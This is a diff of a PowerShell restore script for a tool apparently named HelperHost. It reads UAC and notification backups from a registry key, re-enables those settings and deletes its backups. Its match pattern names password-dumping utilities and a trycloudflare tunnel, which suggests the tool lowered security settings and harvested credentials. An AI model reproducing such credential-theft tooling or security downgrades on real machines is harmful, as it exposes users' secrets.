@@ -7,11 +7,22 @@ $tools = Join-Path $hh 'tools'
 
 $mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|hh-wipe|hh-restore|hh-export'
 
-# --- UAC (restore from backup if present) ---
+# --- UAC (restore from registry backup / legacy file) ---
 $sysPol = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
 $uacBak = Join-Path $hh 'uac-backup.json'
 $uj = $null
-if (Test-Path $uacBak) {
+$regState = $null
+try {
+  $regState = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
+  if ($regState) {
+    $sj = $regState | ConvertFrom-Json
+    if ($sj.uac_bak) {
+      if ($sj.uac_bak -is [string]) { $uj = $sj.uac_bak | ConvertFrom-Json }
+      else { $uj = $sj.uac_bak }
+    }
+  }
+} catch {}
+if (-not $uj -and (Test-Path $uacBak)) {
   try { $uj = Get-Content $uacBak -Raw | ConvertFrom-Json } catch {}
 }
 if (Test-Path $sysPol) {
@@ -234,7 +245,16 @@ $push = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications'
 $exp = 'HKCU:\Software\Policies\Microsoft\Windows\Explorer'
 $ns = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings'
 $j = $null
-if (Test-Path $bak) {
+try {
+  if ($regState) {
+    $sj2 = $regState | ConvertFrom-Json
+    if ($sj2.notify_bak) {
+      if ($sj2.notify_bak -is [string]) { $j = $sj2.notify_bak | ConvertFrom-Json }
+      else { $j = $sj2.notify_bak }
+    }
+  }
+} catch {}
+if (-not $j -and (Test-Path $bak)) {
   try { $j = Get-Content $bak -Raw | ConvertFrom-Json } catch {}
 }
 $toast = 1
@@ -272,5 +292,7 @@ foreach ($sub in @(
 $baa = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications'
 if (Test-Path $baa) { Set-ItemProperty $baa -Name GlobalUserDisabled -Value 0 -Type DWord -Force }
 Remove-Item $bak -Force -EA SilentlyContinue
+Remove-Item $uacBak -Force -EA SilentlyContinue
+Remove-Item 'HKCU:\Software\HelperHost' -Recurse -Force -EA SilentlyContinue
 
 Write-Output 'security-restored'
